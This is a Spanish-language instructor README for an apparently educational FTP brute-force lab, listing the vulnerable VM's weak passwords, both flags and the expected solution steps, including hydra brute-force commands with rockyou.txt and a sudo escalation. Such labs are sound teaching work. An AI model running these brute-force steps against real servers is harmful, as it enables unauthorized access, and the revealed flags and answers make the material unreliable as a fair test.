# Laboratorio FTP y Fuerza Bruta

Este laboratorio permite a los estudiantes aplicar técnicas de fuerza bruta y escalada de privilegios en un entorno realista. El objetivo es acceder a un servidor FTP con configuración insegura y obtener dos flags ocultas en el sistema, de esta forma los alumnos lograran comprender:


- Cómo funciona un servidor FTP y el acceso anónimo.
- Utilizar fuerza bruta de contraseñas con la herramienta `hydra`.
- Leer pistas escondidas en archivos accesibles por FTP.
- Conectarse como usuario descubierto mediante diccionario.
- Escalar privilegios en un sistema Linux para acceder como `root`.


## Especificaciones de la maquina

- **Sistema operativo**: Ubuntu Server (sin interfaz gráfica)
- **Servicio activo**: `vsftpd` en el puerto 21
- **Acceso anónimo** habilitado: `/home/ftp/anonymous/IMPORTANT`
- **Usuarios vulnerables**:
  - `james` → contraseña: `superman`
  - `caroline` → contraseña: `babygirl`
- **Privilegios**:
  - `caroline` pertenece al grupo `sudo`
- **Flags del reto**:
  - `/home/james/flag.txt`:  
    `4GEEKS{C0ngr4tul4t10ns_4_UR_F1R5T_FL4G!!!}`
  - `/root/flag.txt`:  
    `4GEEKS{C4R0L1N3_N33D5_A_B3TT3R_P455W0RD!!!}`

### Credenciales de la maquina

```bash
servername: ftp-lab
username: student
password: 4geeks-lab
```

## Pasos esperados por parte del alumno

1. **Conectarse como usuario anónimo vía FTP**:

   ```bash
   ftp <IP_VM>
   ```

2. **Leer el archivo instructions.txt en `/IMPORTANT`**: El archivo sugiere que los usuarios james y caroline deben cambiar sus contraseñas. 

3. **Realizar fuerza bruta con hydra y `rockyou.txt`**:

   ```bash
   hydra -l james -P /usr/share/wordlists/rockyou.txt ftp://<IP_VM>
   hydra -l caroline -P /usr/share/wordlists/rockyou.txt ftp://<IP_VM>
   ```

4. **Conectarse como james vía FTP y recuperar la primera flag**:

   ```bash
   ftp <IP_VM>
   # login: james
   # password: superman
   ```

   ```bash
   get flag.txt
   ```

5. **Conectarse como caroline (por SSH o FTP)**

6. **Escalar privilegios para leer la segunda flag**:

   ```bash
   sudo cat /root/flag.txt
   ```



